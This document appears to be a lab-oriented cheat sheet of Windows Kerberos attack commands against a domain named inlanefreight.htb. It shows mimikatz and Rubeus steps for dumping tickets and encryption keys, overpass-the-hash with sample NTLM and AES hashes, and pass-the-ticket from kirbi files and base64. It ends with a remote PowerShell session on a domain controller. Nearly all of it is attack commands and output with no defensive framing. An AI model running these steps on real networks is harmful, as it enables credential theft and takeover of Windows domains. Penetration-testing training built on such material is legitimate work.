
#### Retrieve kerberos tickets mimikatz
```cmd-session
c:\tools> mimikatz.exe

mimikatz # privilege::debug

sekurlsa::tickets /export

```
#### Rubeus - Export Tickets

  Rubeus - Export Tickets

```cmd-session
c:\tools> Rubeus.exe dump /nowrap
```

### Forge TGT Tickets

#### 1) Extract Kerberos Encryption keys
```cmd-session
c:\tools> mimikatz.exe


mimikatz # privilege::debug


mimikatz # sekurlsa::ekeys
```
#### 2) Mimikatz - Pass the Key or OverPass the Hash (Admin Priv)

  Mimikatz - Pass the Key or OverPass the Hash

```cmd-session
c:\tools> mimikatz.exe


mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
``` 
#### 2) Rubeus - Pass the Key or OverPass the Hash (Non Admin Priv)

  Rubeus - Pass the Key or OverPass the Hash

```cmd-session
c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

#### 3) Rubeus - Pass the Ticket (direct)

```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
#### 3) Rubeus - Pass the ticket (load ticket from .kirbi file)
```cmd-session
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
#### (extra) Convert kirbi to base64
```powershell-session
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
#### 3) Rubeus - Pass the ticket (Ticket in base64)

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
 _
```

#### 3) Mimikatz - PtT with kirbi file
```cmd-session
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```
#### 4) Mimkatz - PtT Remote Powershell
```cmd-session
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"


c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
[DC01]: PS C:\Users\john\Documents>
```

#### 4) Rubeus - PtT Remote Powershell
```cmd-session
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
```cmd-session
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
 
```
```cmd-session
c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
```
